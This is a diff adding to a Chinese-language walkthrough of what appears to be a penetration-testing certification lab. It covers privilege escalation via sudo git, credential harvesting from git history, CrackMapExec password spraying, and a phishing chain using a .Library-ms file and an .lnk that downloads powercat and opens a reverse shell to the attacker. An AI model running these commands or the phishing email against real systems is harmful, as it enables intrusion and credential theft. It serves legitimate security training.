@@ -723,7 +723,7 @@ Nmap done: 1 IP address (1 host up) scanned in 17.54 seconds
 
 確認 WordPress 版本:
 ```
-──(chw㉿CHW)-[~/beyond]
+┌──(chw㉿CHW)-[~/beyond]
 └─$ whatweb http://192.168.117.244
 http://192.168.117.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.117.244], RedirectLocation[http://192.168.117.244/main/], UncommonHeaders[x-redirect-by]
 http://192.168.117.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.117.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2] 
@@ -957,18 +957,382 @@ daniela
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
+```
+daniela@websrv1:~$ wget http://192.168.45.214/linpeas.sh
+daniela@websrv1:~$ chmod +x ./linpeas.sh 
+daniela@websrv1:~$ ./linpeas.sh
+...
+╔══════════╣ Operative system
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                           
+Linux version 5.15.0-48-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #54-Ubuntu SMP Fri Aug 26 13:26:29 UTC 2022                           
+Distributor ID: Ubuntu
+Description:    Ubuntu 22.04.1 LTS
+Release:        22.04
+Codename:       jammy
+...
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                             
+Matching Defaults entries for daniela on websrv1:                                                                                                                                                            
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
->[!Caution]
->```
->┌──(chw㉿CHW)-[~/beyond/websrv1]
->└─$ curl http://192.168.111.244/main/ -v
->*   Trying 192.168.111.244:80...
->* Connected to 192.168.111.244 (192.168.111.244) port 80
-> GET /main/ HTTP/1.1
-> Host: 192.168.111.244
-> User-Agent: curl/8.8.0
-> Accept: */*
-> 
->* Request completely sent off
->```
-> LAB 又掛了
+User daniela may run the following commands on websrv1:
+    (ALL) NOPASSWD: /usr/bin/git
+...
+╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rw-r--r-- 1 www-data www-data 2495 Sep 27 11:31 /srv/www/wordpress/wp-config.php                                                                                                                          
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wordpress' );
+define( 'DB_PASSWORD', 'DanielKeyboard3311' );
+define( 'DB_HOST', 'localhost' );
+...
+╔══════════╣ Analyzing Github Files (limit 70)
+                                                                                                                                
+drwxr----- 8 root root 4096 Sep 27 14:26 /srv/www/wordpress/.git
+```
+> 系統: Ubuntu 22.04.1 LTS\
+> `daniela` 可以不用密碼使用 `sudo git`\
+> WordPress 資料庫: `wordpress`:`DanielKeyboard3311`\
+> 能夠讀取 `.git`: 查看過去的變更，甚至找到敏感資訊
+
+先將憑證存入 `creds.txt`
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ echo "DB_USER: wordpress, DB_PASSWORD: DanielKeyboard3311" >> creds.txt
+```
+#### 2. 濫用 sudo git 進行提權
+查看 [GTFOBins](https://gtfobins.github.io/gtfobins/git/) 提權方法：
+```
+daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
+sudo: sorry, you are not allowed to set the following environment variables: PAGER
+```
+> 這個方法被系統封鎖
+
+嘗試第二種方法：`sudo git`
+```
+daniela@websrv1:~$ sudo git -p help config
+...
+       •   no section or name was provided (ret=2),
+
+       •   the config file is invalid (ret=3),
+
+!/bin/bash
+
+root@websrv1:/home/daniela# whoami
+root
+```
+> 呼叫 execute code，再使用 ! + Command\
+> 成功對 `WEBSRV1` 提權
+
+#### 3. 使用 `.git` 尋找敏感資訊
+```
+root@websrv1:/srv/www/wordpress# git status
+HEAD detached at 612ff57
+nothing to commit, working tree clean
+root@websrv1:/srv/www/wordpress# git log
+commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
+Author: root <root@websrv1>
+Date:   Tue Sep 27 14:26:15 2022 +0000
+
+    Removed staging script and internal network access
+
+commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
+Author: root <root@websrv1>
+Date:   Tue Sep 27 14:24:28 2022 +0000
+
+    initial commit
+
+```
+> 查看 `612ff5783cc5dbd1e0e008523dba83374a84aaf1`: Removed staging script and internal network access
+
+```
+root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
+commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
+Author: root <root@websrv1>
+Date:   Tue Sep 27 14:26:15 2022 +0000
+
+    Removed staging script and internal network access
+
+diff --git a/fetch_current.sh b/fetch_current.sh
+deleted file mode 100644
+index 25667c7..0000000
+--- a/fetch_current.sh
++++ /dev/null
+@@ -1,6 +0,0 @@
+-#!/bin/bash
+-
+-# Script to obtain the current state of the web app from the staging server
+-
+-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
+```
+> `john`:`dqsTwTpZPn#nL` IP: `192.168.50.245`
+
+#### 4. 記錄新獲得的憑證
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ echo "john: dqsTwTpZPn#nL (192.168.50.245)" >> creds.txt
+```
+## Gaining Access to the Internal Network
+### Domain Credentials
+#### 1. 確認現有的憑證
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cat creds.txt    
+daniela: tequieromucho
+DB_USER: wordpress, DB_PASSWORD: DanielKeyboard3311
+john: dqsTwTpZPn#nL (192.168.50.245)
+
+```
+> 已發現的使用者: `marcus`, `daniela`, `john`
+
+建立測試帳號與密碼列表:
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cat usernames.txt 
+marcus
+john
+daniela
+
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cat passwords.txt      
+tequieromucho
+DanielKeyboard3311
+dqsTwTpZPn#nL
+```
+#### 2. CrackMapExec 測試帳密組合
+使用 CrackMapExec 測試這些帳密是否能登入 MAILSRV1 (透過 SMB 協議)
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ crackmapexec smb 192.168.117.242 -u usernames.txt -p passwords.txt --continue-on-success
+SMB         192.168.117.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
+SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
+SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
+SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
+SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
+SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
+SMB         192.168.117.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
+SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
+SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
+SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE
+```
+> `john`:`dqsTwTpZPn#nL` 登入 `MAILSRV1`\
+> 且確認 MAILSRV1 加入 `beyond.com` 網域，在內網的一部分
+
+#### 3. 列舉 `MAILSRV1` 的 SMB 資料夾
+john 的帳密有效，嘗試列舉 `MAILSRV1` 共享的資料夾
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ crackmapexec smb 192.168.117.242 -u john -p "dqsTwTpZPn#nL" --shares
+SMB         192.168.117.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
+SMB         192.168.117.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
+SMB         192.168.117.242 445    MAILSRV1         [+] Enumerated shares
+SMB         192.168.117.242 445    MAILSRV1         Share           Permissions     Remark
+SMB         192.168.117.242 445    MAILSRV1         -----           -----------     ------
+SMB         192.168.117.242 445    MAILSRV1         ADMIN$                          Remote Admin
+SMB         192.168.117.242 445    MAILSRV1         C$                              Default share
+SMB         192.168.117.242 445    MAILSRV1         IPC$            READ            Remote IPC
+
+``` 
+> 沒有可讀取的共享資料夾
+
+### Phishing for Access
+無法透過 MAILSRV1 直接進入內部網路，可以選擇 Client-Side Attack
+常見的 客戶端攻擊方式 ：\
+- 透過 Microsoft Office 文件中的巨集 (Macro) 來執行惡意程式
+- 使用 Windows Library (.Library-ms) + 快捷方式 (.lnk) 執行惡意命令
+
+#### 1. 建立 WebDAV Server
+提供一個遠端共享來儲存 `.Library-ms` 檔案，導致內部使用者點擊 `.lnk` 時，系統會從 WebDAV 伺服器下載惡意指令
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ mkdir webdav 
+┌──(chw㉿CHW)-[~/beyond]
+└─$ pip3 install --user wsgidav
+┌──(chw㉿CHW)-[~/beyond]
+└─$ /home/chw/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/chw/beyond/webdav/
+Running without configuration file.
+09:41:20.250 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+09:41:20.251 - INFO    : WsgiDAV/4.3.3 Python/3.11.9 Linux-6.8.11-arm64-aarch64-with-glibc2.38
+09:41:20.251 - INFO    : Lock manager:      LockManager(LockStorageDict)
+09:41:20.251 - INFO    : Property manager:  None
+09:41:20.251 - INFO    : Domain controller: SimpleDomainController()
+09:41:20.251 - INFO    : Registered DAV providers by route:
+09:41:20.251 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/chw/.local/lib/python3.11/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+09:41:20.251 - INFO    :   - '/': FilesystemProvider for path '/home/chw/beyond/webdav' (Read-Write) (anonymous)
+09:41:20.251 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+09:41:20.251 - WARNING : Share '/' will allow anonymous write access.
+09:41:20.251 - WARNING : Share '/:dir_browser' will allow anonymous write access.
+09:41:20.269 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.0 Python/3.11.9
+09:41:20.269 - INFO    : Serving on http://0.0.0.0:80 ...
+```
+> 成功啟動 WebDAV 伺服器，提供匿名讀取/寫入權限
+
+#### 2. 建立 Windows Library (.Library-ms) 檔案
+登入 RDP (192.168.117.250)，建立 Windows Library 和 shortcut files
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp  /u:offsec  /p:lab /v:192.168.117.250
+```
+![image](https://hackmd.io/_uploads/rJPUKewh1g.png)\
+建立 Library 文件 (`config.Library-ms`)
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.214</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+![image](https://hackmd.io/_uploads/HJxt-bP31g.png)
+
+
+`.Library-ms` 檔案會讓 Windows 嘗試存取 WebDAV 伺服器\
+接著將 `.Library-ms` 傳回 Kali
+```
+PS C:\Users\offsec\Desktop> scp config.Library-ms chw@192.168.45.214:/home/chw/beyond/
+chw@192.168.45.214's password:
+config.Library-ms
+```
+
+#### 3. 建立惡意 `.lnk` shortcut files
+建立捷徑：\
+![image](https://hackmd.io/_uploads/HJyB5lv3Jx.png)
+```
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.214:8000/powercat.ps1'); powercat -c 192.168.45.214 -p 8888 -e powershell"
+```
+> - 從 Kali 伺服器 (http://192.168.45.214:8000) 下載 `powercat.ps1`\
+> - 使用 PowerCat 建立反向 Shell (nc -nvlp 8888)\
+> - 回連到 Kali 機器 (192.168.45.214:8888)
+
+![image](https://hackmd.io/_uploads/rJ6dcxPnJe.png)\
+接著傳回 WebDav\
+![image](https://hackmd.io/_uploads/r15EfZP2ke.png)
+
+
+#### 4. 設定 PowerCat Server
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+
+┌──(chw㉿CHW)-[~/beyond]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+#### 5. 啟動 Netcat 監聽
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ nc -nvlp 8888
+listening on [any] 8888 ..
+```
+#### 6. 發送釣魚郵件
+在 `/beyond/webdav` 建立 body.tx
+```                                   
+┌──(chw㉿CHW)-[~/beyond/webdav]
+└─$ cat body.txt        
+Hey!
+I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.
+
+On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
+
+John
+```
+> 偽裝成內部 IT 人員，誘導受害者開啟 `.Library-ms` 檔案
+
+使用 `swaks` 送出釣魚郵件
+```
+┌──(chw㉿CHW)-[~/beyond/webdav]
+└─$ ls
+body.txt  config.Library-ms  powershell.lnk
+       
+┌──(chw㉿CHW)-[~/beyond/webdav]
+└─$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.117.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+[sudo] password for chw: 
+Username: john
+Password: dqsTwTpZPn#nL
+=== Trying 192.168.117.242:25...
+=== Connected to 192.168.117.242.
+<-  220 MAILSRV1 ESMTP
+ -> EHLO CHW.CHW
+<-  250-MAILSRV1
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> AUTH LOGIN
+<-  334 VXNlcm5hbWU6
+ -> am9obg==
+<-  334 UGFzc3dvcmQ6
+ -> ZHFzVHdUcFpQbiNuTA==
+<-  235 authenticated.
+ -> MAIL FROM:<john@beyond.com>
+<-  250 OK
+ -> RCPT TO:<marcus@beyond.com>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> 72 lines sent
+<-  250 Queued (13.172 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+```
+> `-t daniela@beyond.com -t marcus@beyond.com`: 收件人給 daniela 和 marcus\
+`--from john@beyond.com`: 寄件人偽造 john@beyond.com\
+`--attach @config.Library-ms`: 附件 `config.Library-ms`\
+`--server 192.168.117.242`: 指定 SMTP 伺服器 (MAILSRV1)\
+`--body @body.txt`:郵件內容\
+`--header "Subject: Staging Script"`: 郵件標題（"Staging Script"）\
+`--suppress-data`: 隱藏郵件內容細節，只顯示 SMTP 結果\
+`-ap`: 啟用身份驗證
+>> 成功送出
+
+#### 7. 成功獲得內部網路存取
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.117.242 - - [18/Mar/2025 10:27:07] "GET /powercat.ps1 HTTP/1.1" 200 -
+
+```
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ nc -nvlp 8888
+listening on [any] 8888 ...
+
+connect to [192.168.45.214] from (UNKNOWN) [192.168.117.242] 62505
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
+whoami
+beyond\marcus
+PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
+hostname
+CLIENTWK1
+PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 172.16.73.243
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.73.254
+PS C:\Windows\System32\WindowsPowerShell\v1.0> 
+```
